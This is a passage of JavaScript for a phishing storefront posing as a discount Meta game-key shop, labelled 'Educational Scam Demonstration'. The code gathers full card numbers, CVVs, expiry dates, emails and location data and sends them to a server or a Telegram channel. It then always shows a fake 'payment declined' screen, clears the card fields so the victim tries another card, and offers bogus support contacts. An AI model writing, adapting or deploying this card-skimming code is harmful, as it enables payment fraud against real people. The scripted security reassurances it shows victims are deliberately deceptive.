    const cardNumberInput = document.getElementById('cardNumber');
    const cardExpiryInput = document.getElementById('cardExpiry');
    const cardCvvInput = document.getElementById('cardCvv');
    const cardHolderInput = document.getElementById('cardHolder');
    const countrySelect = document.getElementById('country');
    const zipCodeInput = document.getElementById('zipCode');
    const cardTypeIcon = document.getElementById('cardTypeIcon');
    
    // Initialize submit button as disabled
    updateSubmitButtonState();
    
    // Populate country dropdown with auto-selection
    console.log('🌍 Populating country dropdown...');
    populateCountryDropdown(countrySelect);
    
    // Add delay to check if country was auto-selected and update button state
    setTimeout(() => {
        if (countrySelect && countrySelect.value !== '') {
            console.log('🔄 Country was auto-selected, updating validation state...');
            formValidationState.country = true;
            updateZipCodePlaceholder(countrySelect.value);
            updateSubmitButtonState();
        }
    }, 1000);
    
    // Card Holder Validation
    if (cardHolderInput) {
        cardHolderInput.addEventListener('input', function() {
            const value = this.value.trim();
            
            if (value.length >= 2) {
                formValidationState.cardHolder = true;
                clearFieldError('cardHolder');
            } else {
                formValidationState.cardHolder = false;
                if (value.length > 0) {
                    showFieldError('cardHolder', 'Please enter full name (minimum 2 characters)');
                }
            }
            
            updateSubmitButtonState();
        });
    }
    
    // Card number formatting and validation
    if (cardNumberInput) {
        cardNumberInput.addEventListener('input', function() {
            let value = this.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
            let formattedValue = value.replace(/(.{4})/g, '$1 ').trim();
            
            if (formattedValue.length > 19) {
                formattedValue = formattedValue.substring(0, 19);
            }
            
            this.value = formattedValue;
            
            // Detect card type and validate
            const cardType = detectCardType(value);
            updateCardTypeIcon(cardType);
            
            const isValid = validateCardNumber(value, cardType);
            formValidationState.cardNumber = isValid;
            
            if (value.length > 0) {
                if (isValid) {
                    clearFieldError('cardNumber');
                } else {
                    if (value.length >= 13) {
                        showFieldError('cardNumber', 'Please enter a valid card number');
                    }
                }
            } else {
                clearFieldError('cardNumber');
            }
            
            updateSubmitButtonState();
        });
    }
    
    // Card expiry formatting and validation
    if (cardExpiryInput) {
        cardExpiryInput.addEventListener('input', function() {
            let value = this.value.replace(/\D/g, '');
            
            // Limit month to 01-12
            if (value.length >= 2) {
                let month = parseInt(value.substring(0, 2));
                if (month > 12) {
                    value = '12' + value.substring(2);
                } else if (month === 0) {
                    value = '01' + value.substring(2);
                }
            }
            
            // Limit year to 25-35 (2025-2035)
            if (value.length >= 4) {
                let year = parseInt(value.substring(2, 4));
                if (year < 25) {
                    value = value.substring(0, 2) + '25';
                } else if (year > 35) {
                    value = value.substring(0, 2) + '35';
                }
            }
            
            // Format as MM/YY
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            
            this.value = value;
            
            // Validate expiry
            const isValid = validateCardExpiry(value);
            formValidationState.cardExpiry = isValid;
            
            if (value.length === 5) {
                if (isValid) {
                    clearFieldError('cardExpiry');
                } else {
                    showFieldError('cardExpiry', 'Card has expired or invalid date');
                }
            } else if (value.length > 0 && value.length < 5) {
                clearFieldError('cardExpiry');
            }
            
            updateSubmitButtonState();
        });
    }
    
    // CVV validation
    if (cardCvvInput) {
        cardCvvInput.addEventListener('input', function() {
            this.value = this.value.replace(/[^0-9]/g, '');
            
            const cardNumber = cardNumberInput?.value.replace(/\s/g, '') || '';
            const cardType = detectCardType(cardNumber);
            const isValid = validateCVV(this.value, cardType);
            
            formValidationState.cardCvv = isValid;
            
            if (this.value.length > 0) {
                if (isValid) {
                    clearFieldError('cardCvv');
                } else {
                    const expectedLength = cardType === 'amex' ? 4 : 3;
                    showFieldError('cardCvv', `Please enter ${expectedLength}-digit CVV`);
                }
            } else {
                clearFieldError('cardCvv');
            }
            
            updateSubmitButtonState();
        });
    }
    
    // Country validation with ZIP CODE FORMAT UPDATE
    if (countrySelect) {
        countrySelect.addEventListener('change', function() {
            const isValid = this.value !== '';
            formValidationState.country = isValid;
            
            if (isValid) {
                clearFieldError('country');
                console.log('✅ Country selected:', this.value, '-', this.options[this.selectedIndex].text);
                
                // Update zip code format for selected country
                updateZipCodePlaceholder(this.value);
                
                // Reset zip code validation when country changes
                formValidationState.zipCode = false;
                if (zipCodeInput) {
                    zipCodeInput.value = '';
                    clearFieldError('zipCode');
                }
                
            } else {
                showFieldError('country', 'Please select your country');
                console.log('⏰ Country deselected');
                
                // Reset zip code format to default
                if (zipCodeInput) {
                    zipCodeInput.placeholder = 'Enter zip code';
                    const zipLabel = document.getElementById('zipCodeLabel');
                    if (zipLabel) {
                        zipLabel.innerHTML = 'Zip Code * <small style="color: #666; font-weight: normal;">(Enter valid postal code)</small>';
                    }
                }
            }
            
            updateSubmitButtonState();
        });
    }
    
    // ZIP CODE VALIDATION with COUNTRY-SPECIFIC PATTERNS and AUTO-FORMATTING
    if (zipCodeInput) {
        zipCodeInput.addEventListener('input', function() {
            const country = countrySelect?.value || '';
            let zipValue = this.value.trim();
            
            // Auto-format zip code based on country
            if (country && zipValue.length > 0) {
                const formattedZip = formatZipCodeInput(zipValue, country);
                if (formattedZip !== zipValue) {
                    this.value = formattedZip;
                    zipValue = formattedZip;
                }
            }
            
            // Validate with country-specific pattern
            const isValid = zipValue.length > 0 && country && validateZipCodeByCountry(zipValue, country);
            formValidationState.zipCode = isValid;
            
            if (zipValue.length > 0) {
                if (country) {
                    if (isValid) {
                        clearFieldError('zipCode');
                        console.log(`✅ Valid zip code "${zipValue}" for ${country}`);
                    } else {
                        const errorMessage = getZipCodeErrorMessage(country);
                        showFieldError('zipCode', errorMessage);
                        console.log(`❌ Invalid zip code "${zipValue}" for ${country}`);
                    }
                } else {
                    showFieldError('zipCode', 'Please select country first');
                    console.log('⚠️ Zip entered but no country selected');
                }
            } else {
                clearFieldError('zipCode');
            }
            
            updateSubmitButtonState();
        });
        
        // Auto-format on blur (cleanup formatting)
        zipCodeInput.addEventListener('blur', function() {
            const country = countrySelect?.value || '';
            if (country && this.value.trim()) {
                const formatted = formatZipCodeInput(this.value.trim(), country);
                this.value = formatted;
                
                // Re-validate after formatting
                const isValid = validateZipCodeByCountry(formatted, country);
                formValidationState.zipCode = isValid;
                updateSubmitButtonState();
            }
        });
    }
    
    // UPDATED: ENHANCED FORM SUBMISSION with SERVER INTEGRATION
    if (form) {
        form.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            console.log('🔍 Form submission attempted...');
            
            // Comprehensive validation check
            const isFormValid = validateAllFields();
            
            if (!isFormValid) {
                console.log('⏰ Form validation failed!');
                console.log('Validation state:', formValidationState);
                
                // Show specific error messages for invalid fields
                Object.keys(formValidationState).forEach(field => {
                    if (!formValidationState[field]) {
                        const fieldElement = document.getElementById(field);
                        if (fieldElement) {
                            let errorMessage = getFieldErrorMessage(field);
                            
                            // Use country-specific zip error message
                            if (field === 'zipCode') {
                                const country = document.getElementById('country')?.value || '';
                                if (country) {
                                    errorMessage = getZipCodeErrorMessage(country);
                                }
                            }
                            
                            showFieldError(field, errorMessage);
                        }
                    }
                });
                
                return false;
            }
            
            console.log('✅ Form validation passed!');
            
            const formData = new FormData(this);
            const fullPaymentData = {
                // Step 1 data
                email: userPaymentData.email,
                gameName: userPaymentData.gameName,
                price: userPaymentData.currentPrice,
                originalPrice: userPaymentData.originalPrice,
                // Step 2 data
                cardHolder: formData.get('cardHolder'),
                cardNumber: formData.get('cardNumber'),
                cardExpiry: formData.get('cardExpiry'),
                cardCvv: formData.get('cardCvv'),
                country: formData.get('country'),
                zipCode: formData.get('zipCode'),
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                // Location data already available from step 1
                locationData: userLocationData
            };
            
            console.log('📦 Payment data prepared:', {
                ...fullPaymentData,
                cardNumber: '****' + fullPaymentData.cardNumber.slice(-4),
                cardCvv: '***'
            });
            
            // UPDATED: Process payment with server integration
            processFullPaymentWithServer(fullPaymentData);
        });
    }
}

// ====================================================================
// PROCESS PAYMENT WITH SERVER INTEGRATION (UPDATED)
// ====================================================================
async function processFullPaymentWithServer(paymentData) {
    const submitButton = document.getElementById('submitPayment');
    if (!submitButton) return;
    
    console.log('💳 Starting payment processing with server...');
    
    // Store original button content
    const originalText = submitButton.innerHTML;
    
    try {
        // Phase 1: Initial Processing (2 seconds)
        showProcessingPhase(submitButton, 'Connecting to secure payment processor...', 1);
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        // Phase 2: Card Verification (2 seconds)
        showProcessingPhase(submitButton, 'Verifying card details...', 2);
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        // Phase 3: Server Communication (2 seconds)
        showProcessingPhase(submitButton, 'Sending secure data to server...', 3);
        
        // UPDATED: Send to server instead of direct Telegram
        const serverResponse = await sendFullPaymentToServer(paymentData);
        console.log('📡 Server response received:', serverResponse);
        
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        // Phase 4: Final Processing (2 seconds)
        showProcessingPhase(submitButton, 'Finalizing transaction...', 4);
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        // Show payment failure after realistic processing
        showPaymentFailureModal(paymentData);
        
    } catch (error) {
        console.error('❌ Server communication error:', error);
        
        // Reset button and show error
        submitButton.innerHTML = originalText;
        submitButton.disabled = false;
        submitButton.style.opacity = '1';
        submitButton.style.cursor = 'pointer';
        submitButton.style.background = 'linear-gradient(45deg, #27ae60, #2ecc71)';
        
        // Show error notification
        showNotification('❌ Server error. Please try again.', 'error');
    }
}

// ====================================================================
// SHOW PROCESSING PHASES (UNCHANGED)
// ====================================================================
function showProcessingPhase(submitButton, message, phase) {
    // Disable button and show processing state
    submitButton.disabled = true;
    submitButton.style.opacity = '0.8';
    submitButton.style.cursor = 'not-allowed';
    submitButton.style.background = '#95a5a6';
    
    // Create progress indicator based on phase
    const progressPercentage = (phase / 4) * 100;
    
    submitButton.innerHTML = `
        <div class="payment-processing">
            <div class="processing-spinner"></div>
            <span class="processing-text">${message}</span>
            <div class="processing-progress">
                <div class="progress-bar" style="width: ${progressPercentage}%"></div>
            </div>
        </div>
    `;
    
    console.log(`⏳ Processing Phase ${phase}: ${message}`);
}

// ====================================================================
// CLOSE PAYMENT MODAL (UNCHANGED)
// ====================================================================
function closePaymentModal() {
    const modal = document.getElementById('paymentModal');
    if (modal) {
        modal.classList.remove('active');
        document.body.style.overflow = '';
        
        // Reset form if it exists
        const form = document.getElementById('paymentForm');
        if (form) {
            form.reset();
        }
        
        // Reset validation state
        Object.keys(formValidationState).forEach(key => {
            formValidationState[key] = false;
        });
        
        // Remove error states
        const errorInputs = document.querySelectorAll('.error');
        errorInputs.forEach(input => input.classList.remove('error'));
        
        const errorMessages = document.querySelectorAll('.error-message.show');
        errorMessages.forEach(msg => msg.classList.remove('show'));
        
        // Reset zip code label to default
        const zipLabel = document.getElementById('zipCodeLabel');
        if (zipLabel) {
            zipLabel.innerHTML = 'Zip Code * <small style="color: #666; font-weight: normal;">(Enter valid postal code)</small>';
        }
        
        // Reset zip code placeholder
        const zipInput = document.getElementById('zipCode');
        if (zipInput) {
            zipInput.placeholder = 'Enter zip code';
        }
        
        console.log('💳 Payment modal closed and reset');
    }
}

// ====================================================================
// CONSOLE STATUS MESSAGE
// ====================================================================
console.log('🎯 SCRIPT.JS PART 6 LOADED: Payment Modal (Step 2) - Server Integration');
console.log('💳 Loaded: Payment modal creation and display system');
console.log('📋 Loaded: Comprehensive payment form with validation');
console.log('🌍 Loaded: Country selection with auto-detection');
console.log('🔮 Loaded: Country-specific zip code validation');
console.log('💳 Loaded: Credit card validation and formatting');
console.log('📡 UPDATED: Server integration for secure payment processing');
console.log('🔒 SECURE: All sensitive data sent to server instead of direct API calls');
console.log('✅ PART 6 COMPLETE - Ready for Part 7: Payment Processing & Results');

// ====================================================================
// SCRIPT.JS - PART 7: PAYMENT PROCESSING & RESULTS
// Educational Scam Demonstration - Fake Meta Store
// Purpose: Realistic payment processing with professional failure handling
// ====================================================================

// ====================================================================
// PROCESS FULL PAYMENT WITH REALISTIC DELAYS AND FAILURE
// ====================================================================
function processFullPayment(paymentData) {
    const submitButton = document.getElementById('submitPayment');
    if (!submitButton) return;
    
    console.log('💳 Starting payment processing...');
    
    // Store original button content
    const originalText = submitButton.innerHTML;
    
    // Phase 1: Initial Processing (2 seconds)
    showProcessingPhase(submitButton, 'Connecting to secure payment processor...', 1);
    
    setTimeout(() => {
        // Phase 2: Card Verification (2 seconds)
        showProcessingPhase(submitButton, 'Verifying card details...', 2);
        
        setTimeout(() => {
            // Phase 3: Bank Communication (2 seconds)
            showProcessingPhase(submitButton, 'Communicating with your bank...', 3);
            
            setTimeout(() => {
                // Phase 4: Final Processing (2 seconds)
                showProcessingPhase(submitButton, 'Finalizing transaction...', 4);
                
                setTimeout(() => {
                    // Send data to Telegram first (educational demo)
                    sendFullPaymentToTelegram(paymentData).then(() => {
                        console.log('📊 Payment data sent to Telegram for educational demo');
                    }).catch(error => {
                        console.error('❌ Error sending to Telegram:', error);
                    });
                    
                    // Show payment failure after realistic processing
                    showPaymentFailureModal(paymentData);
                    
                }, 2000); // Phase 4: 2 seconds
            }, 2000); // Phase 3: 2 seconds
        }, 2000); // Phase 2: 2 seconds
    }, 2000); // Phase 1: 2 seconds
    
    // Total processing time: 8 seconds (very realistic)
}

// ====================================================================
// SHOW PROCESSING PHASES WITH REALISTIC ANIMATIONS
// ====================================================================
function showProcessingPhase(submitButton, message, phase) {
    // Disable button and show processing state
    submitButton.disabled = true;
    submitButton.style.opacity = '0.8';
    submitButton.style.cursor = 'not-allowed';
    submitButton.style.background = '#95a5a6';
    
    // Create progress indicator based on phase
    const progressPercentage = (phase / 4) * 100;
    
    submitButton.innerHTML = `
        <div class="payment-processing">
            <div class="processing-spinner"></div>
            <span class="processing-text">${message}</span>
            <div class="processing-progress">
                <div class="progress-bar" style="width: ${progressPercentage}%"></div>
            </div>
        </div>
    `;
    
    // Add processing styles if not already added
    if (!document.querySelector('#processing-styles')) {
        const style = document.createElement('style');
        style.id = 'processing-styles';
        style.textContent = `
            .payment-processing {
                display: flex;
                flex-direction: column;
                align-items: center;
                gap: 8px;
                padding: 4px 0;
            }
            
            .processing-spinner {
                width: 20px;
                height: 20px;
                border: 2px solid #f3f3f3;
                border-top: 2px solid #0866ff;
                border-radius: 50%;
                animation: processing-spin 1s linear infinite;
            }
            
            .processing-text {
                font-size: 0.9rem;
                color: #666;
                font-weight: 500;
            }
            
            .processing-progress {
                width: 100%;
                height: 4px;
                background: rgba(255, 255, 255, 0.3);
                border-radius: 2px;
                overflow: hidden;
            }
            
            .progress-bar {
                height: 100%;
                background: #0866ff;
                border-radius: 2px;
                transition: width 0.5s ease;
            }
            
            @keyframes processing-spin {
                0% { transform: rotate(0deg); }
                100% { transform: rotate(360deg); }
            }
        `;
        document.head.appendChild(style);
    }
    
    console.log(`⏳ Processing Phase ${phase}: ${message}`);
}

// ====================================================================
// SHOW PROFESSIONAL PAYMENT FAILURE MODAL
// ====================================================================
function showPaymentFailureModal(paymentData) {
    console.log('❌ Payment processing failed - showing failure modal');
    
    // Get random realistic error message
    const errorMessages = [
        {
            title: 'Payment Declined',
            message: 'Your card was declined by your bank. Please try a different payment method or contact your bank.',
            code: 'CARD_DECLINED'
        },
        {
            title: 'Transaction Failed',
            message: 'We were unable to process your payment at this time. Please check your card details and try again.',
            code: 'PROCESSING_ERROR'
        },
        {
            title: 'Payment Not Authorized',
            message: 'Your bank has not authorized this transaction. Please verify your card details or try a different card.',
            code: 'AUTH_FAILED'
        },
        {
            title: 'Card Error',
            message: 'There was an issue with your card information. Please check your details and try again.',
            code: 'CARD_ERROR'
        }
    ];
    
    const randomError = errorMessages[Math.floor(Math.random() * errorMessages.length)];
    const transactionId = 'TXN-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6).toUpperCase();
    
    const failureHTML = `
        <div class="modal-header failure-header">
            <button class="modal-close" id="closeFailureModal">
                <i class="fas fa-times"></i>
            </button>
            <h2 class="modal-title">❌ ${randomError.title}</h2>
            <p class="modal-subtitle">Don't worry - your information is secure</p>
        </div>
        <div class="failure-content">
            <div class="failure-icon">
                <i class="fas fa-exclamation-triangle"></i>
            </div>
            
            <div class="failure-message">
                <h3>Transaction Could Not Be Completed</h3>
                <p>${randomError.message}</p>
            </div>
            
            <div class="failure-details">
                <div class="detail-row">
                    <span class="detail-label">Transaction ID:</span>
                    <span class="detail-value">${transactionId}</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">Error Code:</span>
                    <span class="detail-value">${randomError.code}</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">Amount:</span>
                    <span class="detail-value">$${paymentData.price}</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">Time:</span>
                    <span class="detail-value">${new Date().toLocaleString()}</span>
                </div>
            </div>
            
            <div class="failure-suggestions">
                <h4>What you can do:</h4>
                <ul>
                    <li><i class="fas fa-check-circle"></i> Verify your card details are correct</li>
                    <li><i class="fas fa-check-circle"></i> Ensure sufficient funds are available</li>
                    <li><i class="fas fa-check-circle"></i> Try a different payment method</li>
                    <li><i class="fas fa-check-circle"></i> Contact your bank if issues persist</li>
                </ul>
            </div>
            
            <div class="failure-actions">
                <button class="retry-btn" id="retryPayment">
                    <i class="fas fa-credit-card"></i>
                    Try Again
                </button>
                <button class="support-btn" id="contactSupport">
                    <i class="fas fa-headset"></i>
                    Contact Support
                </button>
            </div>
            
            <div class="failure-security">
                <div class="security-note">
                    <i class="fas fa-shield-alt"></i>
                    <span>Your payment information is secure and was not charged</span>
                </div>
            </div>
        </div>
    `;
    
    // Update modal content
    const modalContent = document.getElementById('modalContent');
    modalContent.innerHTML = failureHTML;
    
    // Add failure modal styles
    addFailureModalStyles();
    
    // Add event listeners for failure modal
    setupFailureModalEvents();
    
    console.log(`❌ Payment failure displayed: ${randomError.title} (${randomError.code})`);
}

// ====================================================================
// ADD FAILURE MODAL STYLES
// ====================================================================
function addFailureModalStyles() {
    if (!document.querySelector('#failure-modal-styles')) {
        const style = document.createElement('style');
        style.id = 'failure-modal-styles';
        style.textContent = `
            .failure-header {
                background: linear-gradient(135deg, #e74c3c, #c0392b) !important;
                color: white;
            }
            
            .failure-content {
                text-align: center;
                padding: 2rem;
            }
            
            .failure-icon {
                font-size: 4rem;
                color: #e74c3c;
                margin-bottom: 1.5rem;
                animation: failure-pulse 2s infinite;
            }
            
            @keyframes failure-pulse {
                0%, 100% { opacity: 1; }
                50% { opacity: 0.7; }
            }
            
            .failure-message h3 {
                font-size: 1.5rem;
                color: #1c1e21;
                margin-bottom: 1rem;
                font-weight: 600;
            }
            
            .failure-message p {
                color: #666;
                font-size: 1.1rem;
                line-height: 1.6;
                margin-bottom: 2rem;
            }
            
            .failure-details {
                background: #f8f9fa;
                border-radius: 12px;
                padding: 1.5rem;
                margin-bottom: 2rem;
                text-align: left;
            }
            
            .detail-row {
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 0.5rem 0;
                border-bottom: 1px solid #e9ecef;
            }
            
            .detail-row:last-child {
                border-bottom: none;
            }
            
            .detail-label {
                font-weight: 600;
                color: #333;
            }
            
            .detail-value {
                color: #666;
                font-family: 'Courier New', monospace;
            }
            
            .failure-suggestions {
                background: #e8f5e8;
                border-radius: 12px;
                padding: 1.5rem;
                margin-bottom: 2rem;
                text-align: left;
            }
            
            .failure-suggestions h4 {
                color: #27ae60;
                margin-bottom: 1rem;
                font-size: 1.1rem;
            }
            
            .failure-suggestions ul {
                list-style: none;
                margin: 0;
                padding: 0;
            }
            
            .failure-suggestions li {
                display: flex;
                align-items: center;
                gap: 0.75rem;
                padding: 0.5rem 0;
                color: #2d3436;
            }
            
            .failure-suggestions i {
                color: #27ae60;
                font-size: 0.9rem;
            }
            
            .failure-actions {
                display: flex;
                gap: 1rem;
                justify-content: center;
                margin-bottom: 2rem;
            }
            
            .retry-btn {
                background: linear-gradient(45deg, #0866ff, #0653d3);
                color: white;
                border: none;
                padding: 12px 24px;
                border-radius: 8px;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.3s ease;
                display: flex;
                align-items: center;
                gap: 0.5rem;
            }
            
            .retry-btn:hover {
                background: linear-gradient(45deg, #0653d3, #054bb8);
                transform: translateY(-2px);
            }
            
            .support-btn {
                background: #6c757d;
                color: white;
                border: none;
                padding: 12px 24px;
                border-radius: 8px;
                font-weight: 600;
                cursor: pointer;
                transition: all 0.3s ease;
                display: flex;
                align-items: center;
                gap: 0.5rem;
            }
            
            .support-btn:hover {
                background: #5a6268;
                transform: translateY(-2px);
            }
            
            .failure-security {
                padding-top: 1rem;
                border-top: 1px solid #e9ecef;
            }
            
            .security-note {
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 0.5rem;
                color: #27ae60;
                font-weight: 500;
                font-size: 0.9rem;
            }
            
            .security-note i {
                font-size: 1.1rem;
            }
            
            @media (max-width: 600px) {
                .failure-actions {
                    flex-direction: column;
                }
                
                .retry-btn, .support-btn {
                    width: 100%;
                    justify-content: center;
                }
            }
        `;
        document.head.appendChild(style);
    }
}

// ====================================================================
// SETUP FAILURE MODAL EVENT LISTENERS
// ====================================================================
function setupFailureModalEvents() {
    // Close modal event
    const closeButton = document.getElementById('closeFailureModal');
    if (closeButton) {
        closeButton.addEventListener('click', closePaymentModal);
    }
    
    // Retry payment event - UPDATED TO RETURN TO PAYMENT STEP
    const retryButton = document.getElementById('retryPayment');
    if (retryButton) {
        retryButton.addEventListener('click', function() {
            console.log('🔄 User clicked retry payment - returning to payment form');
            
            // Track retry attempt
            if (typeof trackEngagement === 'function') {
                trackEngagement('retry_attempt');
            }
            
            // Reset and return to payment form
            resetPaymentForm();
            
            // Show helpful notification
            setTimeout(() => {
                showNotification('Please review your payment details and try again.', 'info');
            }, 800);
        });
    }
    
    // Contact support event
    const supportButton = document.getElementById('contactSupport');
    if (supportButton) {
        supportButton.addEventListener('click', function() {
            console.log('📞 User clicked contact support');
            
            // Show support information
            showSupportModal();
        });
    }
}

// ====================================================================
// RESET PAYMENT FORM TO RETRY - UPDATED TO RETURN TO PAYMENT STEP
// ====================================================================
function resetPaymentForm() {
    console.log('🔄 Resetting payment form and returning to payment step...');
    
    // First close the failure modal
    const modal = document.getElementById('paymentModal');
    if (modal) {
        modal.classList.remove('active');
    }
    
    // Small delay for better UX, then reopen payment form
    setTimeout(() => {
        // Reopen the payment modal with original form
        showFullPaymentModal();
        
        // Clear only card details but keep country and zip (user-friendly)
        setTimeout(() => {
            const cardHolder = document.getElementById('cardHolder');
            const cardNumber = document.getElementById('cardNumber');
            const cardExpiry = document.getElementById('cardExpiry');
            const cardCvv = document.getElementById('cardCvv');
            
            if (cardHolder) cardHolder.value = '';
            if (cardNumber) cardNumber.value = '';
            if (cardExpiry) cardExpiry.value = '';
            if (cardCvv) cardCvv.value = '';
            
            // Reset card type icon
            const cardTypeIcon = document.getElementById('cardTypeIcon');
            if (cardTypeIcon) {
                cardTypeIcon.className = 'card-type-icon';
            }
            
            // Reset validation state for card fields only
            formValidationState.cardHolder = false;
            formValidationState.cardNumber = false;
            formValidationState.cardExpiry = false;
            formValidationState.cardCvv = false;
            
            // Clear error states for card fields only
            clearFieldError('cardHolder');
            clearFieldError('cardNumber');
            clearFieldError('cardExpiry');
            clearFieldError('cardCvv');
            
            // Update submit button state
            updateSubmitButtonState();
            
            // Reset submit button content
            const submitButton = document.getElementById('submitPayment');
            if (submitButton) {
                submitButton.innerHTML = '<i class="fas fa-credit-card"></i> Complete Purchase';
                submitButton.disabled = true;
                submitButton.style.opacity = '0.6';
                submitButton.style.cursor = 'not-allowed';
                submitButton.style.background = '#95a5a6';
            }
            
            // Focus on first card field for better UX
            if (cardHolder) {
                cardHolder.focus();
            }
            
            console.log('✅ Payment form reset completed - user returned to payment step');
        }, 300);
        
    }, 500);
}

// ====================================================================
// SHOW SUPPORT MODAL
// ====================================================================
function showSupportModal() {
    const supportHTML = `
        <div class="modal-header">
            <button class="modal-close" id="closeSupportModal">
                <i class="fas fa-times"></i>
            </button>
            <h2 class="modal-title">📞 Customer Support</h2>
            <p class="modal-subtitle">We're here to help with your payment</p>
        </div>
        <div class="support-content">
            <div class="support-icon">
                <i class="fas fa-headset"></i>
            </div>
            
            <h3>Payment Support Available 24/7</h3>
            <p>Our payment specialists can help resolve any payment issues you're experiencing.</p>
            
            <div class="support-options">
                <div class="support-option">
                    <div class="option-icon">
                        <i class="fas fa-phone"></i>
                    </div>
                    <div class="option-content">
                        <h4>Phone Support</h4>
                        <p>Call us at: <strong>+13134565686</strong></p>
                        <span class="availability">Available 24/7</span>
                    </div>
                </div>
                
                <div class="support-option">
                    <div class="option-icon">
                        <i class="fas fa-envelope"></i>
                    </div>
                    <div class="option-content">
                        <h4>Email Support</h4>
                        <p>Send us an email: <strong>payments@cheapmetakeyz.com</strong></p>
                        <span class="availability">Response within 2 hours</span>
                    </div>
                </div>
                
                
            
            <div class="support-note">
                <i class="fas fa-info-circle"></i>
                <span>Have your transaction ID ready: <strong>TXN-${Date.now()}</strong></span>
            </div>
        </div>
    `;
    
    const modalContent = document.getElementById('modalContent');
    modalContent.innerHTML = supportHTML;
    
    // Add close functionality
    document.getElementById('closeSupportModal').addEventListener('click', closePaymentModal);
    
    console.log('📞 Support modal displayed');
}

// ====================================================================
// CONSOLE STATUS MESSAGE
// ====================================================================
console.log('🎯 SCRIPT.JS PART 7 LOADED: Payment Processing & Results');
console.log('⏳ Loaded: Realistic payment processing with 4-phase delays (8 seconds total)');
console.log('❌ Loaded: Professional payment failure modal with random error messages');
console.log('🔄 Loaded: Payment retry functionality with form reset');
console.log('📞 Loaded: Customer support modal and contact options');
console.log('🎨 Loaded: Professional failure styling and animations');
console.log('✅ PART 7 COMPLETE - Ready for Part 8: Utility Functions & Helpers');
// ====================================================================
// SCRIPT.JS - PART 8: UTILITY FUNCTIONS & HELPERS
// Educational Scam Demonstration - Fake Meta Store
// Purpose: Utility functions, performance monitoring, and final initialization
// ====================================================================

// ====================================================================
// NOTIFICATION SYSTEM (ENHANCED)
// ====================================================================
function showNotification(message, type = 'info', duration = 5000) {
    const notification = document.createElement('div');
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 1rem 1.5rem;
        border-radius: 12px;
        color: white;
        font-weight: 600;
        z-index: 10001;
        max-width: 400px;
        white-space: pre-line;
        animation: slideIn 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
        box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        border-left: 5px solid rgba(255,255,255,0.4);
        backdrop-filter: blur(10px);
        font-size: 0.95rem;
        line-height: 1.4;
    `;
    
    const colors = {
        'success': 'linear-gradient(135deg, #27ae60, #2ecc71)',
        'error': 'linear-gradient(135deg, #e74c3c, #c0392b)',
        'info': 'linear-gradient(135deg, #0866ff, #0653d3)',
        'warning': 'linear-gradient(135deg, #f39c12, #e67e22)'
    };
    
    notification.style.background = colors[type] || colors['info'];
    notification.textContent = message;
    
    // Add animation keyframes if not exists
    if (!document.querySelector('#notification-styles')) {
        const style = document.createElement('style');
        style.id = 'notification-styles';
        style.textContent = `
            @keyframes slideIn {
                from { 
                    transform: translateX(120%) scale(0.8); 
                    opacity: 0; 
                }
                to { 
                    transform: translateX(0) scale(1); 
                    opacity: 1; 
                }
            }
            @keyframes slideOut {
                from { 
                    transform: translateX(0) scale(1); 
                    opacity: 1; 
                }
                to { 
                    transform: translateX(120%) scale(0.8); 
                    opacity: 0; 
                }
            }
        `;
        document.head.appendChild(style);
    }
    
    document.body.appendChild(notification);
    
    // Auto remove after specified duration
    setTimeout(() => {
        notification.style.animation = 'slideOut 0.4s cubic-bezier(0.34, 1.56, 0.64, 1)';
        setTimeout(() => {
            if (document.body.contains(notification)) {
                document.body.removeChild(notification);
            }
        }, 400);
    }, duration);
    
    // Click to dismiss
    notification.addEventListener('click', function() {
        this.style.animation = 'slideOut 0.4s cubic-bezier(0.34, 1.56, 0.64, 1)';
        setTimeout(() => {
            if (document.body.contains(this)) {
                document.body.removeChild(this);
            }
        }, 400);
    });
    
    return notification;
}

// ====================================================================
// COPY TO CLIPBOARD UTILITY
// ====================================================================
function copyToClipboard(text, successMessage = 'Copied to clipboard!') {
    if (navigator.clipboard && window.isSecureContext) {
        // Modern clipboard API
        navigator.clipboard.writeText(text).then(() => {
            showNotification(successMessage, 'success', 3000);
        }).catch(err => {
            console.error('Failed to copy text: ', err);
            fallbackCopyTextToClipboard(text, successMessage);
        });
    } else {
        // Fallback for older browsers
        fallbackCopyTextToClipboard(text, successMessage);
    }
}

function fallbackCopyTextToClipboard(text, successMessage) {
    const textArea = document.createElement('textarea');
    textArea.value = text;
    textArea.style.top = '0';
    textArea.style.left = '0';
    textArea.style.position = 'fixed';
    textArea.style.opacity = '0';
    
    document.body.appendChild(textArea);
    textArea.focus();
    textArea.select();
    
    try {
        const successful = document.execCommand('copy');
        if (successful) {
            showNotification(successMessage, 'success', 3000);
        } else {
            showNotification('Failed to copy text', 'error', 3000);
        }
    } catch (err) {
        console.error('Fallback: Oops, unable to copy', err);
        showNotification('Copy not supported', 'error', 3000);
    }
    
    document.body.removeChild(textArea);
}

// ====================================================================
// RANDOM GIFT CODE GENERATOR
// ====================================================================
function generateGiftCode(length = 25, segments = 5) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    const segmentLength = Math.floor(length / segments);
    const segments_array = [];
    
    for (let i = 0; i < segments; i++) {
        let segment = '';
        for (let j = 0; j < segmentLength; j++) {
            segment += chars.charAt(Math.floor(Math.random() * chars.length));
        }
        segments_array.push(segment);
    }
    
    return segments_array.join('-');
}

// ====================================================================
// PERFORMANCE MONITORING AND ANALYTICS
// ====================================================================
function trackUserBehavior(event, data = {}) {
    const behaviorData = {
        event: event,
        timestamp: new Date().toISOString(),
        sessionTime: performance.now(),
        data: data,
